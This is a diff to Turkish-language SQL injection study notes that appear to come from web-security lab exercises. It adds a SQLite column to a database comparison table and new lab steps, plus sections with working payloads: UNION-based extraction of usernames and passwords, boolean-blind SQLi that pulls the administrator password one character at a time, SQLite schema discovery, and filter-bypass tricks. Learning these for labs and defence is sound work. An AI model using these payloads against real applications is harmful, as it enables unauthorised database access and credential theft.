@@ -47,12 +47,13 @@ password: herhangi bir şey
 
 ## DBMS'e Göre Farklar
 
-| | MySQL | MSSQL | Oracle | PostgreSQL |
-|---|---|---|---|---|
-| Versiyon | `@@version` | `@@version` | `SELECT banner FROM v$version` | `version()` |
-| Yorum | `-- -` veya `#` | `--` | `--` | `--` |
-| String concat | `CONCAT()` | `+` | `\|\|` | `\|\|` |
-| Dual tablosu | gereksiz | gereksiz | `FROM dual` **şart** | gereksiz |
+| | MySQL | MSSQL | Oracle | PostgreSQL | SQLite |
+|---|---|---|---|---|---|
+| Versiyon | `@@version` | `@@version` | `SELECT banner FROM v$version` | `version()` | `sqlite_version()` |
+| Yorum | `-- -` veya `#` | `--` | `--` | `--` | `--` |
+| String concat | `CONCAT()` | `+` | `\|\|` | `\|\|` | `\|\|` |
+| Dual tablosu | gereksiz | gereksiz | `FROM dual` **şart** | gereksiz | gereksiz |
+| Tablo keşfi | `information_schema.tables` | `information_schema.tables` | `all_tables` | `information_schema.tables` | `sqlite_master` |
 
 ## Oracle Özel
 
@@ -147,6 +148,52 @@ Hedef: tablo adını bilmiyorsun, sütun adlarını bilmiyorsun → hepsini adı
 4. MySQL/MSSQL versiyon: `Gifts' UNION SELECT @@version,NULL-- -`
 5. Non-Oracle DB contents listing: `information_schema.tables` → tablo bul → `information_schema.columns` → sütun bul → veri çek
 6. Oracle DB contents listing: `all_tables` → tablo bul → `all_tab_columns` → sütun bul → veri çek
+7. UNION column count: `ORDER BY` ile sütun sayısını bul → `UNION SELECT NULL,NULL,NULL--` ile doğrula
+8. String column detection: `' UNION SELECT 'test',NULL--` → hangi sütun string kabul ediyor
+9. Data retrieval from users: `' UNION SELECT username,password FROM users--`
+10. Multiple values in single column: `' UNION SELECT NULL,username||'~'||password FROM users--`
+11. Blind SQLi conditional responses: TrackingId cookie + `SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a` + "Welcome back" farkı → Python script ile otomatize
+
+## Blind SQLi (Boolean-Based)
+
+Sorgu sonucu ekranda görünmüyor, hata da yok. Sayfadaki bir fark (örn. "Welcome back" yazısı) üzerinden evet/hayır sorusu soruyorsun.
+
+```sql
+-- 1) Doğru/yanlış farkını tespit et
+TrackingId=xyz' AND '1'='1    → "Welcome back" VAR (doğru)
+TrackingId=xyz' AND '1'='2    → "Welcome back" YOK (yanlış)
+
+-- 2) Şifrenin ilk harfini bul
+xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
+
+-- 3) Pozisyonu değiştirerek devam (2. harf, 3. harf...)
+-- Elle yapmak yetersiz → Python script veya Burp Intruder ile otomatize et
+```
+
+## SQLite Özel
+
+```sql
+-- SQLite'da tablo keşfi (information_schema YOK → sqlite_master)
+' uNiOn SeLeCt tbl_name FROM sqlite_master WHERE '1'='1
+
+-- Tablo yapısını göster (CREATE TABLE ifadesi döner)
+' uNiOn SeLeCt sql FROM sqlite_master WHERE tbl_name='admintable' AND '1'='1
+
+-- Veri çek
+' uNiOn SeLeCt username FROM admintable WHERE '1'='1
+```
+
+## Filtre Bypass Teknikleri
+
+```sql
+-- Yorum karakteri (-- veya /*) engellendiğinde → tırnağı doğal kapat
+' OR '1'='1
+
+-- Keyword (UNION, SELECT) engellendiğinde → case bypass
+' uNiOn SeLeCt ...
+
+-- Diğer yöntemler: double writing (UNUNIONION), URL encoding (%55NION)
+```
 
 ## Geliştirici Savunması
 
